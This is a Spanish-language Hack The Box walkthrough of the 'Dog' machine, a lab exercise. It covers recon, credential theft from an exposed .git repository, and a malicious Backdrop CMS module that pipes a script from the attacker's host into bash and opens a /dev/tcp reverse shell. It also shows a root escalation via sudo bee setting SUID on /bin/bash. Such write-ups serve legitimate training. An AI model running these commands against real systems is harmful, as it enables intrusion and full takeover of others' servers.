HTB “Dog” – Walkthrough
Autor: Ju4nC
Fecha: 2025-07-14
Plataforma: Hack The Box
Tipo: Boot-to-Root
Dificultad: Fácil

Índice
Reconocimiento

Enumeración

Explotación inicial

Escalada de privilegios

Captura de flags

Herramientas usadas

Conclusiones

Reconocimiento
IP objetivo: 10.10.11.58

Escaneo de puertos
```bash
nmap -p- -n -Pn --min-rate 5000 10.10.11.58 -oG allPorts
```
Se detectan los puertos abiertos y se guarda el resultado en allPorts. Luego, usando ExtractPorts, copiamos los puertos abiertos al portapapeles.

```bash
nmap -p22,80 -sCV 10.10.11.58 -oN targeted
```
Resultado:

Puerto 22 → SSH

Puerto 80 → HTTP (sitio web)

Presencia de un repositorio .git

Enumeración
Clonamos el repositorio .git expuesto:

```bash
python3 GitHack.py http://10.10.11.58/.git/
cd 10.10.11.58
```
En los archivos descargados, settings.php contiene una contraseña. Además:

```bash
grep -r ".htb"
```
Nos muestra un correo vinculado al sitio, útil para autenticarnos en el login.

Explotación inicial
Dentro del sitio, accedemos a la opción de instalar un nuevo módulo. Podemos subir un .tar.gz.

Crear módulo malicioso:
Descargamos un ejemplo de módulo desde
https://backdropcms.org/project/examples

Editamos el archivo page_example.module:

```php
<?php system("curl http://IP_ATACANTE | bash"); ?>
```
En page_example.info, añadimos:

type = module
Empaquetamos:

```bash
tar -zcvf page_example.tar.gz page_example/
```
Servidor y shell reversa:
Creamos un archivo index.html con el payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/IP_ATACANTE/443 0>&1
```
Levantamos servicios:
```bash
python3 -m http.server 80
nc -nlvp 443
```
Al subir el módulo, se ejecuta el payload y conseguimos acceso al sistema con una shell reversa.

Escalada de privilegios
Enumeramos usuarios en el sistema. Reutilizamos la contraseña obtenida del .git y accedemos como un usuario válido. Luego:

```bash
cat user.txt
```
Comprobamos permisos sudo:

```bash
sudo -l
```
Tenemos acceso a bee. Ejecutamos:
```bash
sudo bee --root=/var/www/html eval "system('chmod u+s /bin/bash');"
bash -p
```
Obtenemos acceso como root.

Captura de flags
```bash
cd /root
cat root.txt
```
Herramientas usadas
nmap

ExtractPorts

GitHack.py

Backdrop CMS

curl, nc, bash

python3 -m http.server

Conclusiones
Revisar si .git/ está expuesto puede revelar credenciales.

Backdrop CMS permite cargas maliciosas si no se valida el contenido.

Los permisos sudo deben auditarse, especialmente si permiten ejecución de binarios arbitrarios.

Es importante combinar enumeración activa con análisis manual de archivos sensibles.





